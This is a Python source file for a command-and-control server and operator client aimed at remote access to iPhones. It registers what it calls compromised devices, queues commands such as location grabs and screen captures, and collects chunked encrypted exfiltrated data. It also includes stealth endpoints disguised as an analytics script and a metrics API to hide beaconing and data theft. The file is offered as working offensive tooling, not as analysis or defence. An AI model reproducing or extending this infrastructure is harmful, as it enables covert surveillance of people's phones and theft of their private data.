#!/usr/bin/env python3
"""
C2 Server Infrastructure for iPhone Remote Access
Handles device registration, command execution, and data exfiltration
"""

import asyncio
import base64
import binascii
import hashlib
import json
import logging
import os
import re
import sqlite3
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
from cryptography.fernet import Fernet, InvalidToken
from aiohttp import web, web_request
from aiohttp.web_request import Request
import aiohttp

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Rate limiting storage
rate_limiter = defaultdict(list)
RATE_LIMIT_WINDOW = 60  # seconds
MAX_REQUESTS_PER_WINDOW = 100


def validate_device_id(device_id: str) -> bool:
    """Validate device ID format"""
    if not device_id or not isinstance(device_id, str):
        return False
    # Device ID should be alphanumeric with hyphens, reasonable length
    if len(device_id) < 8 or len(device_id) > 50:
        return False
    if not re.match(r'^[a-zA-Z0-9_-]+$', device_id):
        return False
    return True


def check_rate_limit(client_ip: str) -> bool:
    """Check if client has exceeded rate limit"""
    now = time.time()
    client_history = rate_limiter[client_ip]
    
    # Remove old entries outside window
    client_history[:] = [req_time for req_time in client_history if now - req_time < RATE_LIMIT_WINDOW]
    
    # Check if exceeded limit
    if len(client_history) >= MAX_REQUESTS_PER_WINDOW:
        logger.warning(f"Rate limit exceeded for {client_ip}")
        return False
    
    # Record this request
    client_history.append(now)
    return True


def get_client_ip(request: Request) -> str:
    """Extract client IP address from request"""
    # Try to get real IP from proxy
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    peername = request.transport.get_extra_info('peername')
    if peername:
        return peername[0]
    
    return 'unknown'


def create_error_response(message: str, status_code: int = 400) -> web.Response:
    """Create standardized error response"""
    return web.json_response(
        {'status': 'error', 'message': message},
        status=status_code
    )


def get_db_connection(db_path: Path, timeout: float = 10.0) -> sqlite3.Connection:
    """Create database connection with timeout"""
    return sqlite3.connect(str(db_path), timeout=timeout)


class C2Server:
    """Command and Control server for iPhone remote access"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 9443, encryption_key: bytes = None):
        self.host = host
        self.port = port
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
        self.app = web.Application()
        self.db_path = Path("c2_data.db")
        self.exfil_path = Path("exfiltrated_data")
        self.exfil_path.mkdir(exist_ok=True)
        
        self._setup_routes()
        self._init_database()
        
    def _setup_routes(self):
        """Setup HTTP routes for C2 communication"""
        self.app.router.add_post('/api/register', self.handle_register)
        self.app.router.add_post('/api/command', self.handle_command)
        self.app.router.add_post('/api/exfil', self.handle_exfiltration)
        self.app.router.add_get('/api/heartbeat', self.handle_heartbeat)
        self.app.router.add_get('/api/devices', self.handle_list_devices)
        self.app.router.add_post('/api/queue_command', self.handle_queue_command)
        
        # Stealth routes that look like normal web traffic
        self.app.router.add_get('/assets/js/analytics.js', self.handle_stealth_beacon)
        self.app.router.add_post('/api/metrics', self.handle_stealth_exfil)
        self.app.router.add_get('/health', self.handle_health_check)
        
    def _init_database(self):
        """Initialize SQLite database for C2 operations"""
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        # Devices table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS devices (
                device_id TEXT PRIMARY KEY,
                info TEXT,
                registered_at REAL,
                last_seen REAL,
                status TEXT
            )
        """)
        
        # Commands table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command TEXT,
                args TEXT,
                status TEXT,
                created_at REAL,
                executed_at REAL,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            )
        """)
        
        # Exfiltrated data table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                data_type TEXT,
                file_path TEXT,
                size INTEGER,
                exfiltrated_at REAL,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            )
        """)
        
        # Heartbeat log
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS heartbeats (
                device_id TEXT,
                timestamp REAL,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            )
        """)
        
        conn.commit()
        conn.close()
        
    async def handle_register(self, request: web.Request) -> web.Response:
        """Handle device registration with validation and error handling"""
        client_ip = get_client_ip(request)
        
        # Rate limiting
        if not check_rate_limit(client_ip):
            return create_error_response("Rate limit exceeded", 429)
        
        try:
            # Parse request data
            data = await request.json()
            
            # Validate required fields
            if 'device_id' not in data or 'info' not in data:
                logger.warning(f"Missing required fields from {client_ip}")
                return create_error_response("Missing required fields: device_id, info", 400)
            
            device_id = data['device_id']
            
            # Validate device_id
            if not validate_device_id(device_id):
                logger.warning(f"Invalid device_id from {client_ip}: {device_id}")
                return create_error_response("Invalid device_id format", 400)
            
            # Decrypt and parse device info
            try:
                encrypted_info = base64.b64decode(data['info'])
                device_info = json.loads(self.fernet.decrypt(encrypted_info))
            except (binascii.Error, ValueError, InvalidToken) as e:
                logger.error(f"Decryption failed for {device_id} from {client_ip}: {e}")
                return create_error_response("Invalid encrypted data", 400)
            
            # Database operations with error handling
            conn = None
            try:
                conn = get_db_connection(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute("""
                    INSERT OR REPLACE INTO devices (device_id, info, registered_at, last_seen, status)
                    VALUES (?, ?, ?, ?, ?)
                """, (device_id, json.dumps(device_info), time.time(), time.time(), 'active'))
                
                conn.commit()
                logger.info(f"Device registered: {device_id} from {client_ip}")
                
                return web.json_response({'status': 'success'})
                
            except sqlite3.Error as e:
                logger.error(f"Database error during registration: {e}")
                return create_error_response("Database error", 500)
                
            finally:
                if conn:
                    conn.close()
                    
        except asyncio.TimeoutError:
            logger.error(f"Request timeout from {client_ip}")
            return create_error_response("Request timeout", 408)
            
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON from {client_ip}: {e}")
            return create_error_response("Invalid JSON format", 400)
            
        except Exception as e:
            logger.error(f"Unexpected error during registration from {client_ip}: {e}", exc_info=True)
            return create_error_response("Internal server error", 500)
            
    async def handle_command(self, request: web.Request) -> web.Response:
        """Handle command execution request with validation and error handling"""
        client_ip = get_client_ip(request)
        
        # Rate limiting
        if not check_rate_limit(client_ip):
            return create_error_response("Rate limit exceeded", 429)
        
        try:
            # Parse request data
            data = await request.json()
            
            # Validate required fields
            if 'device_id' not in data or 'command' not in data:
                logger.warning(f"Missing required fields in command request from {client_ip}")
                return create_error_response("Missing required fields: device_id, command", 400)
            
            device_id = data['device_id']
            
            # Validate device_id
            if not validate_device_id(device_id):
                logger.warning(f"Invalid device_id in command request: {device_id}")
                return create_error_response("Invalid device_id format", 400)
            
            # Decrypt command
            try:
                encrypted_cmd = base64.b64decode(data['command'])
                command = json.loads(self.fernet.decrypt(encrypted_cmd))
            except (binascii.Error, ValueError, InvalidToken, json.JSONDecodeError) as e:
                logger.error(f"Command decryption failed from {client_ip}: {e}")
                return create_error_response("Invalid encrypted command", 400)
            
            # Execute command (this would be handled by device agent)
            result = await self._execute_command(device_id, command)
            
            # Encrypt and return result
            encrypted_result = self.fernet.encrypt(json.dumps(result).encode())
            
            logger.info(f"Command executed for {device_id} from {client_ip}")
            return web.json_response({
                'status': 'success',
                'response': base64.b64encode(encrypted_result).decode()
            })
            
        except asyncio.TimeoutError:
            logger.error(f"Command request timeout from {client_ip}")
            return create_error_response("Request timeout", 408)
            
        except Exception as e:
            logger.error(f"Command execution error from {client_ip}: {e}", exc_info=True)
            return create_error_response("Internal server error", 500)
            
    async def _execute_command(self, device_id: str, command: Dict) -> Dict:
        """Execute command and store in database with error handling"""
        conn = None
        try:
            conn = get_db_connection(self.db_path)
            cursor = conn.cursor()
            
            # Validate command structure
            if 'command' not in command:
                raise ValueError("Command structure missing 'command' field")
            
            cursor.execute("""
                INSERT INTO commands (device_id, command, args, status, created_at)
                VALUES (?, ?, ?, ?, ?)
            """, (
                device_id,
                command['command'],
                json.dumps(command.get('args', {})),
                'pending',
                time.time()
            ))
            
            command_id = cursor.lastrowid
            conn.commit()
            
            # Return command ID for tracking
            return {
                'command_id': command_id,
                'status': 'queued'
            }
            
        except sqlite3.Error as e:
            logger.error(f"Database error in _execute_command: {e}")
            raise
        finally:
            if conn:
                conn.close()
        
    async def handle_exfiltration(self, request: web.Request) -> web.Response:
        """Handle data exfiltration from device"""
        try:
            data = await request.json()
            device_id = data['device_id']
            data_type = data['data_type']
            chunk_id = data['chunk_id']
            total_chunks = data['total_chunks']
            encrypted_data = base64.b64decode(data['data'])
            
            # Decrypt data
            decrypted_data = self.fernet.decrypt(encrypted_data)
            
            # Save chunk
            device_dir = self.exfil_path / device_id / data_type
            device_dir.mkdir(parents=True, exist_ok=True)
            
            chunk_file = device_dir / f"chunk_{chunk_id:04d}.bin"
            chunk_file.write_bytes(decrypted_data)
            
            # If all chunks received, reassemble
            if chunk_id == total_chunks - 1:
                await self._reassemble_chunks(device_id, data_type, total_chunks)
                
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            print(f"[!] Exfiltration error: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
            
    async def _reassemble_chunks(self, device_id: str, data_type: str, total_chunks: int):
        """Reassemble data chunks into complete file"""
        device_dir = self.exfil_path / device_id / data_type
        
        # Combine chunks
        complete_data = b''
        for i in range(total_chunks):
            chunk_file = device_dir / f"chunk_{i:04d}.bin"
            if chunk_file.exists():
                complete_data += chunk_file.read_bytes()
                chunk_file.unlink()  # Delete chunk after reading
                
        # Save complete file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = device_dir / f"{data_type}_{timestamp}.bin"
        output_file.write_bytes(complete_data)
        
        # Log to database
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO exfiltrated_data (device_id, data_type, file_path, size, exfiltrated_at)
            VALUES (?, ?, ?, ?, ?)
        """, (device_id, data_type, str(output_file), len(complete_data), time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Data reassembled: {output_file} ({len(complete_data)} bytes)")
        
    async def handle_heartbeat(self, request: web.Request) -> web.Response:
        """Handle device heartbeat"""
        try:
            device_id = request.query.get('device_id')
            
            # Update last seen
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute("""
                UPDATE devices SET last_seen = ? WHERE device_id = ?
            """, (time.time(), device_id))
            
            cursor.execute("""
                INSERT INTO heartbeats (device_id, timestamp) VALUES (?, ?)
            """, (device_id, time.time()))
            
            # Check for pending commands
            cursor.execute("""
                SELECT id, command, args FROM commands
                WHERE device_id = ? AND status = 'pending'
                ORDER BY created_at ASC
            """, (device_id,))
            
            pending = []
            for row in cursor.fetchall():
                cmd_id, command, args = row
                pending.append({
                    'id': cmd_id,
                    'command': command,
                    'args': json.loads(args)
                })
                
                # Mark as sent
                cursor.execute("""
                    UPDATE commands SET status = 'sent' WHERE id = ?
                """, (cmd_id,))
                
            conn.commit()
            conn.close()
            
            return web.json_response({
                'status': 'ok',
                'pending_commands': pending
            })
            
        except Exception as e:
            print(f"[!] Heartbeat error: {e}")
            return web.json_response({'status': 'error'}, status=500)
            
    async def handle_list_devices(self, request: web.Request) -> web.Response:
        """List all registered devices"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT device_id, info, registered_at, last_seen, status
                FROM devices
                ORDER BY last_seen DESC
            """)
            
            devices = []
            for row in cursor.fetchall():
                device_id, info, registered_at, last_seen, status = row
                devices.append({
                    'device_id': device_id,
                    'info': json.loads(info),
                    'registered_at': registered_at,
                    'last_seen': last_seen,
                    'status': status,
                    'online': (time.time() - last_seen) < 600  # Online if seen in last 10 min
                })
                
            conn.close()
            
            return web.json_response({'devices': devices})
            
        except Exception as e:
            print(f"[!] List devices error: {e}")
            return web.json_response({'status': 'error'}, status=500)
            
    async def handle_queue_command(self, request: web.Request) -> web.Response:
        """Queue command for device execution"""
        try:
            data = await request.json()
            device_id = data['device_id']
            command = data['command']
            args = data.get('args', {})
            
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO commands (device_id, command, args, status, created_at)
                VALUES (?, ?, ?, ?, ?)
            """, (device_id, command, json.dumps(args), 'pending', time.time()))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            return web.json_response({
                'status': 'success',
                'command_id': command_id
            })
            
        except Exception as e:
            print(f"[!] Queue command error: {e}")
            return web.json_response({'status': 'error'}, status=500)
            
    async def handle_stealth_beacon(self, request: web.Request) -> web.Response:
        """Stealth beacon disguised as analytics script"""
        # Extract device info from headers
        device_id = request.headers.get('X-Request-ID', '')
        
        if device_id:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO heartbeats (device_id, timestamp) VALUES (?, ?)
            """, (device_id, time.time()))
            conn.commit()
            conn.close()
            
        # Return fake analytics script
        script = """
        (function(){
            var _analytics = {
                track: function(e) { console.log('Event:', e); },
                page: function() { console.log('Page view'); }
            };
            window.analytics = _analytics;
        })();
        """
        
        return web.Response(text=script, content_type='application/javascript')
        
    async def handle_stealth_exfil(self, request: web.Request) -> web.Response:
        """Stealth data exfiltration disguised as metrics"""
        try:
            data = await request.json()
            
            # Extract hidden data from "metrics"
            if 'X-Session-Token' in request.headers:
                encoded_data = request.headers['X-Session-Token']
                # Process exfiltrated data
                
            return web.json_response({'status': 'ok'})
            
        except Exception as e:
            return web.json_response({'status': 'error'}, status=500)
            
    async def handle_health_check(self, request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.json_response({'status': 'healthy'})
        
    def run(self):
        """Start C2 server"""
        print(f"[*] Starting C2 server on {self.host}:{self.port}")
        print(f"[*] Encryption key: {self.encryption_key.decode()}")
        print(f"[*] Database: {self.db_path}")
        print(f"[*] Exfil directory: {self.exfil_path}")
        
        web.run_app(self.app, host=self.host, port=self.port)


class C2Client:
    """Client interface for C2 management"""
    
    def __init__(self, server_url: str):
        self.server_url = server_url
        
    async def list_devices(self) -> List[Dict]:
        """List all compromised devices"""
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.server_url}/api/devices") as resp:
                data = await resp.json()
                return data.get('devices', [])
                
    async def queue_command(self, device_id: str, command: str, args: Dict = None) -> int:
        """Queue command for device"""
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{self.server_url}/api/queue_command",
                json={
                    'device_id': device_id,
                    'command': command,
                    'args': args or {}
                }
            ) as resp:
                data = await resp.json()
                return data.get('command_id')
                
    async def monitor_devices(self):
        """Monitor device status"""
        while True:
            devices = await self.list_devices()
            
            print("\n" + "="*80)
            print(f"Active Devices: {len([d for d in devices if d['online']])}")
            print("="*80)
            
            for device in devices:
                status = "🟢 ONLINE" if device['online'] else "🔴 OFFLINE"
                last_seen = datetime.fromtimestamp(device['last_seen']).strftime("%Y-%m-%d %H:%M:%S")
                
                print(f"{status} | {device['device_id']}")
                print(f"  Last seen: {last_seen}")
                print(f"  iOS: {device['info'].get('status', {}).get('ios_version', 'Unknown')}")
                print()
                
            await asyncio.sleep(30)


async def main():
    """Example C2 client usage"""
    client = C2Client("http://localhost:8443")
    
    # List devices
    devices = await client.list_devices()
    print(f"[*] Found {len(devices)} devices")
    
    # Queue commands
    if devices:
        device_id = devices[0]['device_id']
        
        cmd_id = await client.queue_command(device_id, 'get_location')
        print(f"[+] Queued location command: {cmd_id}")
        
        cmd_id = await client.queue_command(device_id, 'capture_screen')
        print(f"[+] Queued screenshot command: {cmd_id}")
        
    # Monitor devices
    await client.monitor_devices()


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'server':
        # Start C2 server
        server = C2Server(host='0.0.0.0', port=9443)
        server.run()
    else:
        # Run client
        asyncio.run(main())
